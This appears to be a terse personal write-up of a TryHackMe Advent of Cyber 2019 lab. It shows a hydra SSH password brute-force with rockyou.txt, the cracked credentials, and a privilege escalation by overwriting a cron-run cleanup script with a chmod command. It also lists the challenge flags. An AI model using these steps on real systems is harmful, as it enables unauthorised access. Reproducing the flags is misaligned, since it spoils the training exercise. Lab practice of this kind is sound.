---
title: "TryHackMe Advent of Cyber 2019 Day 20"
date: 2019-12-20
layout: post
platform: "TryHackMe"
writeup_type: "seasonal"
series: "Advent of Cyber 2019"
event_day: "Day 20"
permalink: "/writeups/advent-of-cyber/adventofcyber-2019-day-20/"
tags:
  - tryhackme
  - seasonal
  - advent-of-cyber-2019
  - day-20
---

# Cronjob Privilege Escalation

```text
nmap
4567/tcp  --ssh
''''
```
hydra -l sam -P /usr/share/wordlists/rockyou.txt ssh://10.10.3.222:4567

ssh--> sam:chocolate
```text

```
/home/ubuntu/flag2.txt -> but we cat run the permission is 400 only by ubuntu user

we got /home/script directory with a clean_up.sh script which run by ubuntu
simply created a file in /tmp
wait a little bit of time it gets deleted. We know by the question instructions that the cron job we want to target runs every minute.

change the script
echo "chmod 777 /home/ubuntu/flag2.txt" > clean_up.sh
```text
[redacted challenge flag]
```
4567
```text
2. Crack sam's password and read flag.txt
```
THM{dec4389bc09669650f3479334532aeab}       -via ssh login sam:chocolate
```text
3. Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?
```
THM{b27d33705f97ba2e1f444ec2da5f5f61}
```text
========================================================
```
